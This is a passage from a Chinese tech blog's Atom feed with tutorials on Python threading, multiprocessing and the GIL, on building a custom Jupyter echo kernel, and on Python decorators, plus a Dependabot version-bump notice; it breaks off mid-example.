      <category term="技术" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="Rust" scheme="https://qiwihui.com/tags/Rust/"/>
    
  </entry>
  
  <entry>
    <title>15. 多线程和多进程 — Python 进阶</title>
    <link href="https://qiwihui.com/qiwihui-blog-133/"/>
    <id>https://qiwihui.com/qiwihui-blog-133/</id>
    <published>2022-08-13T01:54:25.690Z</published>
    <updated>2024-05-15T02:25:31.469Z</updated>
    
    <content type="html"><![CDATA[<p>我们有两种常用的方法来并行运行代码（实现多任务并加快程序速度）：通过线程或通过多进程。</p><span id="more"></span><h2><span id="jin-cheng">进程</span></h2><p>进程是程序的一个实例，例如Python解释器。它们彼此独立，并且不共享相同的内存。</p><p>关键事实：</p><ul><li>一个新进程独立于第一个进程启动</li><li>充分利用多个CPU和内核</li><li>单独的内存空间</li><li>进程之间不共享内存</li><li>每个进程一个GIL（全局解释器锁），即避免了GIL限制</li><li>非常适合CPU密集型处理</li><li>子进程可中断/可终止</li><li>启动进程慢于启动线程</li><li>更大的内存占用</li><li>IPC（进程间通信）更加复杂</li></ul><h3><span id="xian-cheng">线程</span></h3><p>线程是可以调度执行的进程（也称为“轻量级进程”）中的实体。一个进程可以产生多个线程。主要区别在于，进程中的所有线程共享同一内存。</p><p>关键事实：</p><ul><li>可以在一个进程中产生多个线程</li><li>内存在所有线程之间共享</li><li>启动线程比启动进程要快</li><li>适用于 I/O 密集型任务</li><li>轻量</li><li>内存占用少</li><li>所有线程使用一个GIL，即线程受GIL限制</li><li>由于GIL，多线程处理对CPU密集的任务无效</li><li>不可中断/杀死-&gt;注意内存泄漏</li><li>出现竞态情况的可能性增加</li></ul><h3><span id="python-zhong-de-xian-cheng">Python中的线程</span></h3><p>使用 <code>threading</code> 模块。</p><p>注意：由于受CPU限制，以下示例通常不会从多个线程中受益。 它应显示如何使用线程的示例。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">square_numbers</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">        result = i * i</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:        </span><br><span class="line">    threads = []</span><br><span class="line">    num_threads = <span class="number">10</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建线程，并给每一个线程分配函数</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num_threads):</span><br><span class="line">        thread = Thread(target=square_numbers)</span><br><span class="line">        threads.append(thread)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 启动所有线程</span></span><br><span class="line">    <span class="keyword">for</span> thread <span class="keyword">in</span> threads:</span><br><span class="line">        thread.start()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 等待所有线程结束</span></span><br><span class="line">    <span class="comment"># 阻塞主线程直到所有线程结束</span></span><br><span class="line">    <span class="keyword">for</span> thread <span class="keyword">in</span> threads:</span><br><span class="line">        thread.join()</span><br></pre></td></tr></table></figure><h3><span id="xian-cheng-he-shi-you-yong">线程何时有用</span></h3><p>尽管使用了GIL，但在程序必须与速度较慢的设备（例如硬盘驱动器或网络连接）进行通讯时，它仍可用于 I/O 密集型任务。 通过线程化，程序可以花费时间等待这些设备并同时智能地执行其他任务。</p><p>示例：从多个站点下载网站信息。 为每个站点使用一个线程。</p><h3><span id="duo-jin-cheng">多进程</span></h3><p>使用 <code>multiprocessing</code> 模块。 语法与上面非常相似。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">square_numbers</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">        result = i * i</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    processes = []</span><br><span class="line">    num_processes = os.cpu_count()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建进程，并给每一个线程分配函数</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num_processes):</span><br><span class="line">        process = Process(target=square_numbers)</span><br><span class="line">        processes.append(process)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 启动所有进程</span></span><br><span class="line">    <span class="keyword">for</span> process <span class="keyword">in</span> processes:</span><br><span class="line">        process.start()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 等待所有进程结束</span></span><br><span class="line">    <span class="comment"># 阻塞主线程直到所有进程结束</span></span><br><span class="line">    <span class="keyword">for</span> process <span class="keyword">in</span> processes:</span><br><span class="line">        process.join()</span><br></pre></td></tr></table></figure><h3><span id="shi-me-shi-hou-duo-jin-cheng-you-yong">什么时候多进程有用</span></h3><p>这对于必须对大量数据执行大量CPU操作且需要大量计算时间的CPU密集型任务很有用。通过多进程，你可以将数据分成相等的部分，然后在不同的CPU上进行并行计算。</p><p>示例：计算从1到1000000的所有数字的平方数。将数字分成相等大小的部分，并对每个子集使用一个过程。</p><h3><span id="gil-quan-ju-jie-shi-qi-suo">GIL-全局解释器锁</span></h3><p>这是一个互斥锁（或锁），仅允许一个线程控制Python解释器。这意味着即使在多线程体系结构中，GIL一次也只允许一个线程执行。</p><h3><span id="wei-shi-me-xu-yao-ta">为什么需要它？</span></h3><p>之所以需要它，是因为CPython（Python的引用实现）的内存管理不是线程安全的。 Python使用引用计数进行内存管理。这意味着在Python中创建的对象具有引用计数变量，该变量跟踪指向该对象的引用数。当此计数达到零时，将释放对象占用的内存。问题在于该引用计数变量需要保护，以防止两个线程同时增大或减小其值的竞争条件。如果发生这种情况，则可能导致从未释放的内存泄漏，或者在仍然存在对该对象的引用的情况下错误地释放了内存。</p><h3><span id="ru-he-bi-mian-gil">如何避免GIL</span></h3><p>GIL在Python社区中引起很大争议。避免GIL的主要方法是使用多线程而不是线程。另一个（但是很不舒服）的解决方案是避免CPython实现，而使用 <code>Jython</code> 或 <code>IronPython</code> 之类的自由线程Python实现。第三种选择是将应用程序的部分移到二进制扩展模块中，即使用Python作为第三方库的包装器（例如在C / C ++中）。这是 <code>numpy</code> 和 <code>scipy</code> 采取的路径。</p><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      15. 多线程和多进程 — Python 进阶
    
    </summary>
    
      <category term="技术" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="Python" scheme="https://qiwihui.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>chore(deps): bump set-getter from 0.1.0 to 0.1.1</title>
    <link href="https://qiwihui.com/qiwihui-blog-142/"/>
    <id>https://qiwihui.com/qiwihui-blog-142/</id>
    <published>2022-08-13T01:54:25.690Z</published>
    <updated>2022-08-13T01:54:25.690Z</updated>
    
    <content type="html"><![CDATA[<p>Bumps <a href="https://github.com/doowb/set-getter">set-getter</a> from 0.1.0 to 0.1.1.</p><details><summary>Commits</summary><ul><li>See full diff in <a href="https://github.com/doowb/set-getter/commits/0.1.1">compare view</a></li></ul></details><br><p><a href="https://docs.github.com/en/github/managing-security-vulnerabilities/about-dependabot-security-updates#about-compatibility-scores"><img src="https://dependabot-badges.githubapp.com/badges/compatibility_score?dependency-name=set-getter&amp;package-manager=npm_and_yarn&amp;previous-version=0.1.0&amp;new-version=0.1.1" alt="Dependabot compatibility score"></a></p><p>Dependabot will resolve any conflicts with this PR as long as you don’t alter it yourself. You can also trigger a rebase manually by commenting <code>@dependabot rebase</code>.</p><hr><details><summary>Dependabot commands and options</summary><br><p>You can trigger Dependabot actions by commenting on this PR:</p><ul><li><code>@dependabot rebase</code> will rebase this PR</li><li><code>@dependabot recreate</code> will recreate this PR, overwriting any edits that have been made to it</li><li><code>@dependabot merge</code> will merge this PR after your CI passes on it</li><li><code>@dependabot squash and merge</code> will squash and merge this PR after your CI passes on it</li><li><code>@dependabot cancel merge</code> will cancel a previously requested merge and block automerging</li><li><code>@dependabot reopen</code> will reopen this PR if it is closed</li><li><code>@dependabot close</code> will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually</li><li><code>@dependabot ignore this major version</code> will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)</li><li><code>@dependabot ignore this minor version</code> will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)</li><li><code>@dependabot ignore this dependency</code> will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)</li><li><code>@dependabot use these labels</code> will set the current labels as the default for future PRs for this repo and language</li><li><code>@dependabot use these reviewers</code> will set the current reviewers as the default for future PRs for this repo and language</li><li><code>@dependabot use these assignees</code> will set the current assignees as the default for future PRs for this repo and language</li><li><code>@dependabot use this milestone</code> will set the current milestone as the default for future PRs for this repo and language</li></ul><p>You can disable automated security fix PRs for this repo from the <a href="https://github.com/qiwihui/blog/network/alerts">Security Alerts page</a>.</p></details><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      chore(deps): bump set-getter from 0.1.0 to 0.1.1
    
    </summary>
    
    
      <category term="dependencies" scheme="https://qiwihui.com/tags/dependencies/"/>
    
  </entry>
  
  <entry>
    <title>Making kernels for jupyter</title>
    <link href="https://qiwihui.com/qiwihui-blog-40/"/>
    <id>https://qiwihui.com/qiwihui-blog-40/</id>
    <published>2022-08-13T01:54:25.690Z</published>
    <updated>2024-05-15T02:25:31.470Z</updated>
    
    <content type="html"><![CDATA[<p>一个内核是运行和解析用户代码的程序。IPython包含了一个运行和解析Python代码的内核，而且人们已经写了多种语言的内核。</p><p>当Jupyter开始一个内核的时候，它会传递它一个连接文件。它指定了如何与前端开始通信。</p><span id="more"></span><p>以下是实践：</p><h3><span id="an-zhuang-huan-jing">安装环境</span></h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">conda create -n py365400 python=3.6.5 jupyter ipykernel</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">conda activate py365</span></span><br></pre></td></tr></table></figure><h3><span id="lie-chu-dang-qian-nei-he">列出当前内核</span></h3><p>在Unix系统中，可用的内核列在如下文件夹中（<a href="https://jupyter-client.readthedocs.io/en/latest/kernels.html#kernel-specs">Kernel specs</a>）:</p><p>System:</p><ul><li><code>/usr/share/jupyter/kernels</code></li><li><code>/usr/local/share/jupyter/kernels</code></li></ul><p>Env:</p><ul><li><code>&#123;sys.prefix&#125;/share/jupyter/kernels</code></li></ul><p>User:</p><ul><li><code>~/.local/share/jupyter/kernels (Linux)</code></li><li><code>~/Library/Jupyter/kernels (Mac)</code></li></ul><p>用户位置的优先级高于系统级别的，忽略名字的大小写。因此不论系统是否大小写敏感，都可以以同样的烦噶事来获取内核。因为内核名字会在URL出现，因此内核名字需要是一个简单的，只使用ASCII字母，数字和简单的分隔符<code>-</code>，<code>.</code>， <code>_</code>。如果设置了 <code>JUPYTER_PATH</code> 环境变量的话，也会搜索其他位置。</p><p>例如在我的Mac上，有两个个内核，一个是 python 3 的，另一个是 pyspark(python 2) 的。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"> jupyter kernelspec list</span></span><br><span class="line">Available kernels:</span><br><span class="line">  pyspark2    /Users/qiwihui/Library/Jupyter/kernels/pyspark2</span><br><span class="line">  python3     /usr/local/miniconda3/envs/py365/share/jupyter/kernels/python3</span><br></pre></td></tr></table></figure><p>在内核文件夹下，现在会使用三种类型的文件。<code>kernel.json</code>, <code>kernel.js</code>和log图片文件。目前，没有使用其他文件，但是将来可能会改变。</p><p>最重要的文件是 <code>kernel.json</code>，应该是一个json序列化的字典包含以下字段</p><ul><li><code>argv</code>: 用来启动内核的命令行参数列表。<code>&#123;connection_file&#125;</code> 将会被实际的连接文件的路径替换。</li><li><code>display_name</code>: 在UI上展示的内核名字。不像在API中使用的内核名字，这里的名字可以包含任意字符。</li><li><code>language</code>: 内核的语言名字。当载入notebook的时候，如果没有找到匹配的内核，那么匹配相应语言的内核将会被启动。这样允许一个写了任何Python或者julia内核的notebook可以与用户的Python或者julia内核合适的联系起来，即使它们没有在与用户内核同样的名字下。</li><li><code>interrupt_mode</code>：可能是signal或者message指定了客户端如何在这个内核中停止单元运行。是通过发送一个信号呢，还是发送一个<code>interrupt_request</code>消息在<code>control channel</code>。如果没有指定，将默认使用signal模式。</li><li><code>env</code>：为内核设置的环境变量。在内核启动前，会添加到当前的环境变量里。</li><li><code>metadata</code>：关于这个内核的其他相关属性。帮助客户端选择内核。</li></ul><p>比如：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> /usr/local/miniconda3/envs/py365/share/jupyter/kernels/python3/kernel.json</span> </span><br><span class="line">&#123;</span><br><span class="line"> &quot;argv&quot;: [</span><br><span class="line">  &quot;/usr/local/miniconda3/envs/py365/bin/python&quot;,</span><br><span class="line">  &quot;-m&quot;,</span><br><span class="line">  &quot;ipykernel_launcher&quot;,</span><br><span class="line">  &quot;-f&quot;,</span><br><span class="line">  &quot;&#123;connection_file&#125;&quot;</span><br><span class="line"> ],</span><br><span class="line"> &quot;display_name&quot;: &quot;Python 3&quot;,</span><br><span class="line"> &quot;language&quot;: &quot;python&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当内核开始的时候将会传入一个连接文件的路径，这个文件只对当前用户可用，会包含类似下面的一个JSON字典。</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;control_port&quot;</span><span class="punctuation">:</span> <span class="number">50160</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;shell_port&quot;</span><span class="punctuation">:</span> <span class="number">57503</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;transport&quot;</span><span class="punctuation">:</span> <span class="string">&quot;tcp&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;signature_scheme&quot;</span><span class="punctuation">:</span> <span class="string">&quot;hmac-sha256&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;stdin_port&quot;</span><span class="punctuation">:</span> <span class="number">52597</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;hb_port&quot;</span><span class="punctuation">:</span> <span class="number">42540</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;ip&quot;</span><span class="punctuation">:</span> <span class="string">&quot;127.0.0.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;iopub_port&quot;</span><span class="punctuation">:</span> <span class="number">40885</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;key&quot;</span><span class="punctuation">:</span> <span class="string">&quot;a0436f6c-1916-498b-8eb9-e81ab9368e84&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><code>transport</code>, <code>ip</code> 和设定了该使用 ZeroMQ 绑定的五个_port。比如 shell 套接字的地址应该是：<code>tcp://127.0.0.1:57503</code>。在每个内核开始的时候会指定随意的端口。<code>signature_scheme</code> 和 <code>key</code> 用来加密信息，因此系统的其他用户不能发送代码来运行内核。</p><p>现在我需要自己定义一个内核，这个内核可以执行我们定义的逻辑。</p><h3><span id="tian-jia-xin-nei-he">添加新内核</span></h3><p>这是简单的重用 IPython  的内核机制来实现这个新的内核。</p><p>步骤：</p><p>子类化ipykernel.kernelbase.Kernel，然后实现下面的方法和属性</p><p>class MyKernel</p><pre><code>- implementation- implementation_version- banner    Kernel info会返回的信息。Implementation指的是内核而不是语言，比如IPython而不是Python。banner是在控制UI上显示第一个提示符之前的东西。这些都是字符串- language_info    Kernel info会返回的信息字典。应该包含mimetype键，值是目标语言的mimetype，比如text/x-python。name键是实现的语言比如python，file_extension比如.py，而且也可能根据不同语言包含codemirror_mode和pygments_lexer- do_execute(code, silent, store_history=True, user_expressions=None, allow_stdin=False)    执行用户代码        - code：要执行的代码        - silent：是否展示输出        - store_history: 是否在历史里记录代码，并且增加执行次数。        - user_expressions：在代码被执行后对这些表达式求值        - allow_stdin：前端是否提供输入请求    你的方法应该返回一个字典，包含在Execution results规定的字典。为了展现输出，它可以使用send_response() 来发送消息。</code></pre><p>为了启动你的内核，在模块后面加上：</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">from</span> ipykernel.kernelapp <span class="keyword">import</span> IPKernelApp</span><br><span class="line">    IPKernelApp.launch_instance(kernel_class=MyKernel)</span><br></pre></td></tr></table></figure><p>现在创建一个JSON的内核说明文件，然后通过 <code>jupyter kernelspec install &lt;/path/to/kernel&gt;</code>。将你的内核模块放在Python可以导入的地方，一般是当前目录(做测试)。最后，你可以使用 <code>jupyter console --kernel &lt;mykernelname&gt;</code> 来运行你的内核。</p><p>例子：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ls</span> <span class="built_in">echo</span>/</span></span><br><span class="line">echokernel.py kernel.json</span><br></pre></td></tr></table></figure><p><code>echokernel.py</code>:</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> ipykernel.kernelbase <span class="keyword">import</span> Kernel</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">EchoKernel</span>(<span class="title class_ inherited__">Kernel</span>):</span><br><span class="line">    implementation = <span class="string">&#x27;Echo&#x27;</span></span><br><span class="line">    implementation_version = <span class="string">&#x27;1.0&#x27;</span></span><br><span class="line">    language = <span class="string">&#x27;no-op&#x27;</span></span><br><span class="line">    language_version = <span class="string">&#x27;0.1&#x27;</span></span><br><span class="line">    language_info = &#123;</span><br><span class="line">        <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Any text&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;mimetype&#x27;</span>: <span class="string">&#x27;text/plain&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;file_extension&#x27;</span>: <span class="string">&#x27;.txt&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    banner = <span class="string">&quot;Echo kernel - as useful as a parrot&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">do_execute</span>(<span class="params">self, code, silent, store_history=<span class="literal">True</span>, user_expressions=<span class="literal">None</span>,</span></span><br><span class="line"><span class="params">                   allow_stdin=<span class="literal">False</span></span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> silent:</span><br><span class="line">            stream_content = &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;stdout&#x27;</span>, <span class="string">&#x27;text&#x27;</span>: code&#125;</span><br><span class="line">            self.send_response(self.iopub_socket, <span class="string">&#x27;stream&#x27;</span>, stream_content)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&#x27;status&#x27;</span>: <span class="string">&#x27;ok&#x27;</span>,</span><br><span class="line">                <span class="comment"># The base class increments the execution count</span></span><br><span class="line">                <span class="string">&#x27;execution_count&#x27;</span>: self.execution_count,</span><br><span class="line">                <span class="string">&#x27;payload&#x27;</span>: [],</span><br><span class="line">                <span class="string">&#x27;user_expressions&#x27;</span>: &#123;&#125;,</span><br><span class="line">               &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">from</span> ipykernel.kernelapp <span class="keyword">import</span> IPKernelApp</span><br><span class="line">    IPKernelApp.launch_instance(kernel_class=EchoKernel)</span><br></pre></td></tr></table></figure><p><code>kernel.json</code>:</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;argv&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;python&quot;</span><span class="punctuation">,</span><span class="string">&quot;-m&quot;</span><span class="punctuation">,</span><span class="string">&quot;echokernel&quot;</span><span class="punctuation">,</span> <span class="string">&quot;-f&quot;</span><span class="punctuation">,</span> <span class="string">&quot;&#123;connection_file&#125;&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;display_name&quot;</span><span class="punctuation">:</span><span class="string">&quot;Echo&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>安装</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ jupyter kernelspec install echo --user</span><br></pre></td></tr></table></figure><p>这里，只为当前用户添加这个kernel。</p><h3><span id="cha-kan">查看</span></h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">jupyter notebook</span></span><br></pre></td></tr></table></figure><p>选择新创建的内核创建 notebook，并运行代码。</p><p><img src="https://user-images.githubusercontent.com/3297411/47489844-1bdedc00-d87a-11e8-8294-3c412fbcdb52.png" alt="jupyter with new kernel echo"></p><p><img src="https://user-images.githubusercontent.com/3297411/47490179-bf2ff100-d87a-11e8-85b3-3469efa7edc2.png" alt="image"></p><h3><span id="yi-xie-keng">一些坑</span></h3><ol><li>运行 notebook 时无法找到 <code>echokernel</code> 模块：</li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[I 15:48:27.754 NotebookApp] Kernel started: 77759cfa-db55-4b70-be23-c14d69f8d87d</span><br><span class="line">/usr/local/miniconda3/envs/py365/bin/python: No module named echokernel</span><br><span class="line">[I 15:48:30.750 NotebookApp] KernelRestarter: restarting kernel (1/5), new random ports</span><br><span class="line">/usr/local/miniconda3/envs/py365/bin/python: No module named echokernel</span><br><span class="line">[I 15:48:33.766 NotebookApp] KernelRestarter: restarting kernel (2/5), new random ports</span><br><span class="line">/usr/local/miniconda3/envs/py365/bin/python: No module named echokernel</span><br><span class="line">[I 15:48:36.789 NotebookApp] KernelRestarter: restarting kernel (3/5), new random ports</span><br><span class="line">/usr/local/miniconda3/envs/py365/bin/python: No module named echokernel</span><br><span class="line">[I 15:48:39.812 NotebookApp] KernelRestarter: restarting kernel (4/5), new random ports</span><br><span class="line">/usr/local/miniconda3/envs/py365/bin/python: No module named echokernel</span><br></pre></td></tr></table></figure><p>需要将 <code>echokernel.py</code> 放置在 python PATH 中 ，这样在执行命令时才能访问到。</p><h3><span id="geng-duo-ming-ling">更多命令</span></h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ jupyter kernelspec <span class="built_in">help</span></span><br><span class="line">Manage Jupyter kernel specifications.</span><br><span class="line"></span><br><span class="line">Subcommands</span><br><span class="line">-----------</span><br><span class="line"></span><br><span class="line">Subcommands are launched as `jupyter kernelspec cmd [args]`. For information on</span><br><span class="line">using subcommand <span class="string">&#x27;cmd&#x27;</span>, <span class="keyword">do</span>: `jupyter kernelspec cmd -h`.</span><br><span class="line"></span><br><span class="line">list</span><br><span class="line">    List installed kernel specifications.</span><br><span class="line">install</span><br><span class="line">    Install a kernel specification directory.</span><br><span class="line">uninstall</span><br><span class="line">    Alias <span class="keyword">for</span> remove</span><br><span class="line">remove</span><br><span class="line">    Remove one or more Jupyter kernelspecs by name.</span><br><span class="line">install-self</span><br><span class="line">    [DEPRECATED] Install the IPython kernel spec directory <span class="keyword">for</span> this Python.</span><br><span class="line"></span><br><span class="line">To see all available configurables, use `--help-all`</span><br></pre></td></tr></table></figure><h3><span id="shan-chu-nei-he">删除内核</span></h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">jupyter kernelspec uninstall <span class="built_in">echo</span></span></span><br></pre></td></tr></table></figure><h3><span id="can-kao">参考</span></h3><ul><li><a href="https://jupyter-client.readthedocs.io/en/stable/wrapperkernels.html">Making simple Python wrapper kernels</a></li><li><a href="http://landcareweb.com/questions/879/ru-he-jiang-python3nei-he-tian-jia-dao-jupyter-ipython">题 如何将python3内核添加到jupyter（IPython）</a></li><li><a href="https://skyrover.me/2017/12/07/making_kernels_for_jupyter/">翻译 - Making kernels for Jupyter</a></li></ul><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      Making kernels for jupyter
    
    </summary>
    
      <category term="技术" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>13. 装饰器 — Python 进阶</title>
    <link href="https://qiwihui.com/qiwihui-blog-127/"/>
    <id>https://qiwihui.com/qiwihui-blog-127/</id>
    <published>2022-08-13T01:54:25.680Z</published>
    <updated>2024-05-15T02:25:31.469Z</updated>
    
    <content type="html"><![CDATA[<p>装饰器是一个函数，它接受另一个函数并扩展该函数的行为而无需显式修改它。 这是一个非常强大的工具，可以将新功能添加到现有函数中。</p><p>装饰器有2种：</p><ul><li>函数装饰器</li><li>类装饰器</li></ul><p>函数用 <code>@</code> 符号修饰：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@my_decorator</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_function</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><span id="more"></span><h3><span id="han-shu-zhuang-shi-qi">函数装饰器</span></h3><p>为了理解装饰器模式，我们必须了解Python中的函数是一级对象，这意味着像其他任何对象一样，它们可以在另一个函数内定义，作为参数传递给另一个函数或从其他函数返回 。 装饰器是一个将另一个函数作为参数的函数，将其行为包装在内部函数中，并返回包装的函数。 结果，修饰的函数便具有了扩展的功能！</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 装饰器是一个将另一个函数作为参数的函数，将其行为包装在内部函数中，并返回包装的函数。</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start_end_decorator</span>(<span class="params">func</span>):</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">wrapper</span>():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Start&#x27;</span>)</span><br><span class="line">        func()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;End&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_name</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Alex&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">print_name()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 现在通过将其作为参数传递给装饰器函数并将其赋值给自身来包装该函数-&gt;我们的函数已扩展了行为！</span></span><br><span class="line">print_name = start_end_decorator(print_name)</span><br><span class="line">print_name()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Alex</span><br><span class="line"></span><br><span class="line">Start</span><br><span class="line">Alex</span><br><span class="line">End</span><br></pre></td></tr></table></figure><h3><span id="zhuang-shi-qi-yu-fa">装饰器语法</span></h3><p>除了包装函数并将其分配给自身之外，我们还可以通过用 <code>@</code> 装饰函数来实现相同的目的。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@start_end_decorator</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_name</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Alex&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">print_name()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Start</span><br><span class="line">Alex</span><br><span class="line">End</span><br></pre></td></tr></table></figure><h3><span id="guan-yu-han-shu-can-shu">关于函数参数</span></h3><p>如果我们的函数具有输入参数，并且我们尝试使用上面的装饰器将其包装，则它将引发 <code>TypeError</code>，因为我们在包装器内调用函数时也必须使用此参数。 但是，我们可以通过在内部函数中使用 <code>*args</code> 和 <code>**kwargs</code> 来解决此问题：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">start_end_decorator_2</span>(<span class="params">func</span>):</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">wrapper</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Start&#x27;</span>)</span><br><span class="line">        func(*args, **kwargs)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;End&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"><span class="meta">@start_end_decorator_2</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_5</span>(<span 